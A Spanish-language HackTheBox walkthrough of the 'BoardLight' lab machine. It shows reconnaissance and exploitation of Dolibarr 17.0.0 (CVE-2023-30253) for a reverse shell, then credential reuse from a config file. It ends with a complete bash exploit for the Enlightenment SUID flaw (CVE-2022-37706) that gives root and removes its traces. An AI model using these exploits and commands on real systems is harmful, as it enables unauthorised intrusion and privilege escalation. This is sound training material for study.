# Boardlight

![](../../../../~gitbook/image.md)Publicado: 05 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
BoardLight es una máquina de dificultad Easy de HackTheBox que simula un entorno empresarial donde una organización utiliza un sistema CRM (Customer Relationship Management) basado en DoliBarr. La máquina presenta múltiples vectores de ataque que van desde enumeración web básica hasta escalada de privilegios mediante vulnerabilidades en binarios SUID.El objetivo principal es demostrar técnicas comunes de pentesting web, incluyendo fuzzing de subdominios, explotación de vulnerabilidades conocidas (CVE), reutilización de credenciales y escalada de privilegios a través de binarios mal configurados. Esta máquina es perfecta para principiantes que quieren practicar metodologías de pentesting estructuradas y aprender sobre la importancia de mantener sistemas actualizados.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios

### 🌐 Enumeración Web

#### 80 HTTP (board.htb)
![](../../../../~gitbook/image.md)Al acceder al servicio http del puerto 80 no vemos gran cosa. Hay un formulario de contacto que probamos a rellenar interceptando la petición con burp pero no parece estar enviado nada:![](../../../../~gitbook/image.md)
#### 📁 Fuzzing de directorios
Tras realizar fuzzing de directorios con dirsearch no encontramos nada interesante que usar como posible vector de ataque.![](../../../../~gitbook/image.md)Revisando el código fuente de la aplicación enumeramos un dominio board.htb:![](../../../../~gitbook/image.md)Añadimos este dominio al fichero /etc/hosts de nuestro host de ataque:
#### 🌍 Fuzzing de subdominios
Al realizar fuzzing de subdominios encontramos un subdominio llamado crm![](../../../../~gitbook/image.md)Añadimos este nuevo descubrimiento a nuestro fichero /etc/hosts y accedemos a él para analizarlo.
#### 💼 80 HTTP crm.board.htb
Al acceder a este nuevo subdominio descubierto encontramos un servicio llamado DoliBarr en su versión 17.0.0. Buscamos algo de información pública sobre este servicio![](../../../../~gitbook/image.md)Se trata de un software de gestión de CRM del cual podemos encontrar más información en https://www.dolibarr.org/![](../../../../~gitbook/image.md)Al probar con las credenciales `admin:admin` accedemos sin mayor poblema a la herramienta aunque no vemos gran cosa:![](../../../../~gitbook/image.md)
#### 🎯 Acceso Inicial
💥 CVE-2023-30253 - DoliBarr PHP Code InjectionEncontramos además que esta versión es vulnerable a PHP Code InjectionReferencias:- 🔗 Exploit: [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)
- 📄 Advisory: [https://www.swascan.com/security-advisory-dolibarr-17-0-0/](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)
Iniciamos un listener con netcat:Lanzamos el exploit especificando las credenciales y la ip y puerto de nuestro host de ataque:![](../../../../~gitbook/image.md)Conseguimos la ejecución remota de comandos y ganamos acceso al sistema:![](../../../../~gitbook/image.md)
#### 🔄 Post-Explotación
👥 Enumeración de usuariosEnumeramos usuarios en la máquina y comprobamos que no tenemos acceso al directorio de la usuaria larissa
#### 🗄️ Enumeración de base de datos
Descubrimos un fichero `conf.php` en el directorio `~/html/crm.board.htb/htdocs/conf$ `que revela unas credenciales de base de datos:![](../../../../~gitbook/image.md)Nos conectamos a la base de datos![](../../../../~gitbook/image.md)
#### ⬆️ Movimiento lateral
Ninguno de los hashes es crackeable con hashcat y rockyou pero verificamos que se está reutilizando la contraseña `serverfun2$2023!!` para la usuaria larissa y logramos el movimiento lateral:
#### 🔑 Escalada de Privilegios
Verificamos en primer lugar que larissa no puede ejecutar ningún comando o binario como root:Tampoco vemos ninguna capabiliy interesante:Comprobamos binarios con permisos SUID de los que podamos abusar y encontramos uno que no es común llamado Enlightenment y cuya versión además vemos que es la 0.23.1:💥 CVE-2022-37706 - Enlightenment Privilege EscalationUna búsqueda sobre este binario nos muestra un exploit para la escalada de privilegios:🔗 Exploit: [https://github.com/d3ndr1t30x/CVE-2022-37706/tree/main](https://github.com/d3ndr1t30x/CVE-2022-37706/tree/main)📝 Descripción de la vulnerabilidad: La vulnerabilidad existe debido al manejo incorrecto de las rutas de acceso que empiezan por la subcadena `/dev/..` en el binario `enlightenment_sys`, que por defecto es SUID-root. Al explotar este comportamiento, los atacantes pueden ejecutar comandos arbitrarios como root, obteniendo así el control total del sistema.
#### 🚀 Ejecución del exploit y escalada a root

- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯  ping -c2 10.10.11.11
PING 10.10.11.11 (10.10.11.11) 56(84) bytes of data.
64 bytes from 10.10.11.11: icmp_seq=1 ttl=63 time=51.5 ms
64 bytes from 10.10.11.11: icmp_seq=2 ttl=63 time=52.6 ms

--- 10.10.11.11 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1006ms
rtt min/avg/max/mdev = 51.458/52.048/52.638/0.590 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.11 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.11.11 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 13:37 CEST
Nmap scan report for 10.10.11.11
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds

```

```
dirsearch -u http://10.10.11.11 -x 503
```

```
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

```
ffuf -u http://10.10.11.11 -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -mc all -fs 15949
```

```
wget https://raw.githubusercontent.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/refs/heads/main/exploit.py
```

```
nc -nlvp 8000
```

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.3 8000
```

```
www-data@boardlight:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 May 17  2024 .
drwxr-xr-x 19 root    root    4096 May 17  2024 ..
drwxr-x--- 15 larissa larissa 4096 May 17  2024 larissa
www-data@boardlight:/home$ cd larissa
bash: cd: larissa: Permission denied
```

```
mysql -u dolibarrowner -h localhost -p
```

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| dolibarr           |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use dolibarr;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

showDatabase changed
mysql> show tables;
+-------------------------------------------------------------+
| Tables_in_dolibarr                                          |
+-------------------------------------------------------------+
| llx_accounting_account                                      |
| llx_accounting_bookkeeping                                  |
| llx_accounting_bookkeeping_tmp                              |
| llx_accounting_fiscalyear                                   |
| llx_accounting_groups_account                               |
| llx_accounting_journal                                      |

| llx_subscription                                            |
| llx_supplier_proposal                                       |
| llx_supplier_proposal_extrafields                           |
| llx_supplier_proposaldet                                    |
| llx_supplier_proposaldet_extrafields                        |
| llx_takepos_floor_tables                                    |
| llx_tva                                                     |
| llx_user                                                    |
| llx_user_alert                                              |
| llx_user_clicktodial                                        |
| llx_user_employment                                         |
| llx_user_extrafields                                        |
| llx_user_param                                              |
| llx_user_rib                                                |
| llx_user_rights                                             |
| llx_usergroup                                               |
| llx_usergroup_extrafields                                   |
| llx_usergroup_rights                                        |
| llx_usergroup_user                                          |
| llx_website                                                 |
| llx_website_extrafields                                     |
| llx_website_page                                            |
+-------------------------------------------------------------+
307 rows in set (0.00 sec)

mysql> select * from llx_user;

```

```
www-data@boardlight:/home$ su larissa
Password:
larissa@boardlight:/home$ whoami
larissa
larissa@boardlight:/home$ id
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
larissa@boardlight:/home$
```

```
larissa@boardlight:~$ sudo -l
[sudo] password for larissa:
Sorry, user larissa may not run sudo on localhost.
larissa@boardlight:~$
```

```
getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

```
larissa@boardlight:~$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

```
# !/usr/bin/bash
# CVE-2022-37706 Exploit - Enlightenment v0.25.3 Privilege Escalation

echo "CVE-2022-37706 Exploit Initiated"
echo "[*] Using known path to vulnerable binary..."

# Define the vulnerable binary path
file="/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys"

if [[ ! -x ${file} ]]; then
echo "[-] The binary is not executable or doesn't exist."
exit 1
fi

echo "[+] Vulnerable SUID binary found at: $file"
echo "[*] Preparing exploit directories and files..."

# Set up malicious directories and exploit script
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod +x /tmp/exploit

echo "[+] Exploit script created. Attempting to escalate privileges..."

# Trigger the vulnerability
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

# Cleanup prompt
read -p "Press any key to clean up evidence... "
rm -rf /tmp/exploit
rm -rf /tmp/net
echo "[+] Exploit completed. All temporary files removed."
```

```
larissa@boardlight:/tmp$ nano exploit.sh
larissa@boardlight:/tmp$ chmod +x exploit.sh
larissa@boardlight:/tmp$ ./exploit.sh
CVE-2022-37706 Exploit Initiated
[*] Using known path to vulnerable binary...
[+] Vulnerable SUID binary found at: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
[*] Preparing exploit directories and files...
[+] Exploit script created. Attempting to escalate privileges...
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
```
